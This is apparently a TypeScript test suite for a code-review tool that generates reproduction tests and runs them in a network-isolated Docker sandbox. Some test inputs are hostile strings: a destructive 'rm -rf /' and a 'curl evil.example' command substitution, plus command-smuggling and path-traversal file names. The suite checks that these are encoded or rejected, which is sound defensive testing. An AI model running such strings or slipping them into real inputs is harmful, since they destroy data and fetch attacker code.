import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { applyGeneratedTests, generatedTestPathProblem, testCandidates, testCommand, testDraftSchema, testOutcome } from "../src/generated-tests";
import { runtimePolicySchema, generatedTestsKey, runtimePolicyKey } from "../src/runtime-policy";
import { runtimeDefaults } from "../src/review-settings";
import { sandboxArguments } from "../scripts/sandbox";
import { runtimeWorker } from "../scripts/runtime-worker";
import { findingComment } from "../src/review-summary";
import type { Finding } from "../src/engine/types";

const image = "node@sha256:" + "a".repeat(64);
const finding = (fingerprint: string, severity: Finding["severity"], extra: Partial<Finding> = {}): Finding => ({
  title: "Totals become dollars " + fingerprint, description: "total() divides cents by 100 before callers store cents.", severity, confidence: 0.9, category: "correctness",
  filePath: "src/total.js", startLine: 2, endLine: 2, evidence: [{ filePath: "src/total.js", startLine: 2, quote: "return cents / 100;" }],
  impact: "Orders are undercharged.", suggestedFix: "Return cents unchanged.", symbol: "total", fingerprint, agent: "correctness", commitSha: "a".repeat(40), ...extra,
});

test("the runtime policy approves a test command template with exactly one {test} placeholder", () => {
  const base = { ...runtimeDefaults, image };
  assert.ok(runtimePolicySchema.safeParse({ ...base, generatedTests: true, testCommand: "node --test {test}" }).success);
  assert.equal(runtimePolicySchema.safeParse({ ...base, generatedTests: true, testCommand: "node --test" }).success, false);
  assert.equal(runtimePolicySchema.safeParse({ ...base, generatedTests: true, testCommand: "cp {test} x && node --test {test}" }).success, false);
  assert.equal(runtimePolicySchema.safeParse({ ...runtimeDefaults, image: "node:latest", generatedTests: true, testCommand: "node --test {test}" }).success, false, "digest-pinned image required");
  assert.ok(runtimePolicySchema.safeParse({ enabled: false, image: "", command: "", timeout: 120, requiredForApproval: false }).success, "older stored policies stay valid");
  // Test jobs are keyed by their own fields, so existing runtime job keys are unchanged.
  const policy = { ...base, generatedTests: true, testCommand: "node --test {test}" };
  assert.equal(runtimePolicyKey(policy), runtimePolicyKey(base));
  assert.notEqual(generatedTestsKey(policy), generatedTestsKey({ ...policy, testCommand: "npx vitest run {test}" }));
  assert.equal(testCommand("node --test {test}", "src/total.test.js"), "node --test 'src/total.test.js'");
});

test("generated files are new, test-named, repository-relative paths; drafts cannot fake markers or execution", () => {
  const existing = new Set(["src/total.js", "src/total.test.js"]);
  assert.equal(generatedTestPathProblem("src/total.repro.test.js", existing), undefined);
  assert.equal(generatedTestPathProblem("tests/test_total.py", existing), undefined);
  assert.equal(generatedTestPathProblem("pkg/total_test.go", existing), undefined);
  for (const bad of ["src/total.test.js", "../escape.test.js", "/etc/x.test.js", "src/./a.test.js", "src/$(id).test.js", "src/total.js.bak", "src/helper.js", ".github/x.test.js", "a".repeat(201) + ".test.js"]) assert.ok(generatedTestPathProblem(bad, existing), bad);
  const schema = testDraftSchema(existing);
  const code = "import { total } from './total.js';\nimport test from 'node:test';\ntest('cents', () => { if (total(500) !== 500) throw new Error('dollars'); });";
  assert.ok(schema.safeParse({ path: "src/total.repro.test.js", code }).success);
  assert.equal(schema.safeParse({ path: "src/total.repro.test.js", code: code + "\nconsole.log('OPENREVIEW_RUNTIME_STARTED:fake')" }).success, false);
  assert.equal(schema.safeParse({ path: "src/total.repro.test.js", code: "// This test passed when run locally.\n" + code }).success, false);
});

test("outcome policy: started and failing reproduces (+0.05), passing lowers to at most the threshold, anything else is inconclusive", () => {
  const ran = (exitCode: number | null, extra = {}) => ({ exitCode, timedOut: false, executionStarted: true, output: "out", command: "node --test 'x.test.js'", ...extra });
  assert.equal(testOutcome(ran(1)), "reproduced");
  assert.equal(testOutcome(ran(0)), "not reproduced");
  assert.equal(testOutcome(ran(null)), "inconclusive");
  assert.equal(testOutcome(ran(1, { timedOut: true })), "inconclusive");
  assert.equal(testOutcome(ran(1, { executionStarted: false })), "inconclusive");
  assert.equal(testOutcome(undefined), "inconclusive");
  const findings = [finding("aa", "high"), finding("bb", "medium", { confidence: 0.97 }), finding("cc", "low"), finding("dd", "high")];
  const applied = applyGeneratedTests(findings, [
    { fingerprint: "aa", path: "a.test.js", code: "test", evidence: ran(1) },
    { fingerprint: "bb", path: "b.test.js", code: "test", evidence: ran(0) },
    { fingerprint: "cc", path: "c.test.js", code: "test", error: "Docker unavailable" },
  ], 0.85);
  assert.deepEqual(applied.map((f) => [f.confidence, f.generatedTest?.status]), [[0.95, "reproduced"], [0.85, "not reproduced"], [0.9, "inconclusive"], [0.9, undefined]]);
  assert.equal(applyGeneratedTests([finding("aa", "high", { confidence: 0.97 })], [{ fingerprint: "aa", path: "a.test.js", code: "t", evidence: ran(2) }], 0.85)[0].confidence, 0.99);
  assert.equal(applied[2].generatedTest?.output, "Docker unavailable");
  // Deterministic security findings and the lowest priorities are not selected first.
  assert.deepEqual(testCandidates([finding("low", "low"), finding("sec", "critical", { agent: "security-checks" }), finding("hi", "high"), finding("crit", "critical"), finding("med", "medium")]).map((f) => f.fingerprint), ["crit", "hi", "med"]);
});

test("the finding comment carries the recorded outcome, command, code and output in a collapsed block", () => {
  const [f] = applyGeneratedTests([finding("aa", "high")], [{ fingerprint: "aa", path: "src/total.repro.test.js", code: "test('x', () => { throw new Error('```'); });", evidence: { exitCode: 1, timedOut: false, executionStarted: true, output: "not ok 1 - cents\n```injected", command: "node --test 'src/total.repro.test.js'" } }], 0.85);
  const comment = findingComment(f);
  assert.match(comment, /\*\*Generated test:\*\* reproduced the defect \(exit 1\) · `node --test 'src\/total\.repro\.test\.js'`\n\n<details><summary>Test code and output \(generated by OpenReview, never committed\)<\/summary>/);
  assert.equal((comment.match(/```/g) ?? []).length % 2, 0, "fences stay balanced; untrusted backticks are neutralised");
  assert.match(comment, /not ok 1 - cents\n` ` `injected/);
  const timedOut = applyGeneratedTests([finding("aa", "high")], [{ fingerprint: "aa", path: "a.test.js", code: "t()", evidence: { exitCode: 124, timedOut: true, executionStarted: true, output: "", command: "c" } }], 0.85)[0];
  assert.match(findingComment(timedOut), /\*\*Generated test:\*\* timed out; no conclusion/);
});

test("the sandbox writes the generated file from a base64 argument, never as shell text, with the usual limits", () => {
  const content = "'; rm -rf / #\n$(curl evil.example)\n`id`";
  const args = sandboxArguments("t", image, "node --test 'src/x.test.js'", 60, 1, "0".repeat(8) + "-0000-0000-0000-" + "0".repeat(12), { path: "src/x.test.js", content });
  assert.equal(args[args.indexOf("--network") + 1], "none");
  assert.equal(args[args.indexOf("--memory") + 1], "512m");
  assert.ok(args.includes("--read-only") && !args.includes("-v") && !args.includes("--env"));
  const script = args[args.indexOf("-c") + 1];
  assert.match(script, /mkdir -p "\$\(dirname "\$3"\)" && printf "%s" "\$4" \| base64 -d > "\$3" && timeout 60s/);
  assert.ok(!args.slice(0, -1).some((a) => a.includes("rm -rf")), "the content only appears encoded");
  assert.equal(Buffer.from(args.at(-1)!, "base64").toString(), content);
  assert.equal(args.at(-2), "src/x.test.js");
  for (const path of ["../x.test.js", "a b.test.js", "$(id).test.js"]) assert.throws(() => sandboxArguments("t", image, "c", 60, 1, "0".repeat(8) + "-0000-0000-0000-" + "0".repeat(12), { path, content: "x" }));
  assert.throws(() => sandboxArguments("t", image, "c", 60, 1, undefined, { path: "x.test.js", content: "x" }), "files need the execution marker");
  assert.throws(() => sandboxArguments("t", image, "c", 60, 1, "0".repeat(8) + "-0000-0000-0000-" + "0".repeat(12), { path: "x.test.js", content: "x".repeat(20001) }));
});

test("the worker runs each generated test on a fresh snapshot copy and reports per-test evidence, including timeouts and crashes", { timeout: 30000 }, async (t) => {
  const folder = await mkdtemp(join(tmpdir(), "openreview-generated-")), receipt = join(folder, "receipt"), previousPath = process.env.PATH;
  // Fake docker (POSIX sh): records arguments, consumes the archive, prints the start marker and exits by command.
  await writeFile(join(folder, "docker"), `#!/bin/sh\nprintf '%s\\0' "$@" >> '${receipt}'\nprintf '\\n' >> '${receipt}'\nif [ "$1" = run ]; then\n cat > /dev/null\n while [ "$#" -gt 0 ] && [ "$1" != openreview ]; do shift; done\n shift\n printf 'OPENREVIEW_RUNTIME_STARTED:%s\\n' "$2"\n printf 'ran %s\\n' "$3"\n case "$1" in *fails*) exit 1;; *slow*) exit 124;; *crash*) exit 137;; esac\nfi\nexit 0\n`, { mode: 0o700 });
  process.env.PATH = folder + ":/usr/bin:/bin";
  const credential = "orw_" + "a".repeat(64);
  const tests = [
    { fingerprint: "f1", path: "src/a.test.js", content: "assert fails", command: "node --test fails 'src/a.test.js'" },
    { fingerprint: "f2", path: "src/b.test.js", content: "assert ok", command: "node --test 'src/b.test.js'" },
    { fingerprint: "f3", path: "src/c.test.js", content: "slow", command: "node --test slow 'src/c.test.js'" },
  ];
  let snapshots = 0, report: { tests: { fingerprint: string; evidence?: { exitCode: number; executionStarted: boolean; timedOut: boolean; command: string; output: string } }[] } | undefined;
  t.mock.method(globalThis, "fetch", async (input: URL, options: RequestInit) => {
    if (input.pathname.endsWith("claim")) return Response.json({ id: "tests-job", headSha: "a".repeat(40), repository: "o/r", image, command: "node --test {test}", timeout: 30, kind: "tests", tests });
    if (input.pathname.endsWith("snapshot")) { snapshots++; return new Response(new Uint8Array([31, 139, 8, 0])); }
    if (input.pathname.endsWith("report")) { report = JSON.parse(String(options.body)); return Response.json({ ok: true }); }
    return Response.json({ ok: true });
  });
  try {
    await runtimeWorker("http://127.0.0.1:3211", credential, true);
    assert.equal(snapshots, 1, "the snapshot is downloaded once and reused for each test");
    assert.deepEqual(report!.tests.map((r) => [r.fingerprint, r.evidence?.exitCode, r.evidence?.executionStarted, r.evidence?.timedOut, r.evidence?.command]), [["f1", 1, true, false, tests[0].command], ["f2", 0, true, false, tests[1].command], ["f3", 124, true, true, tests[2].command]]);
    const runs = (await readFile(receipt, "utf8")).split("\n").filter(Boolean).map((line) => line.split("\0").filter(Boolean)).filter((a) => a[0] === "run");
    assert.equal(runs.length, 3);
    for (const [i, args] of runs.entries()) {
      assert.equal(args[args.indexOf("--network") + 1], "none");
      assert.equal(Buffer.from(args.at(-1)!, "base64").toString(), tests[i].content);
      assert.equal(args.at(-2), tests[i].path);
    }
  } finally { process.env.PATH = previousPath; await rm(folder, { recursive: true, force: true }); }
});
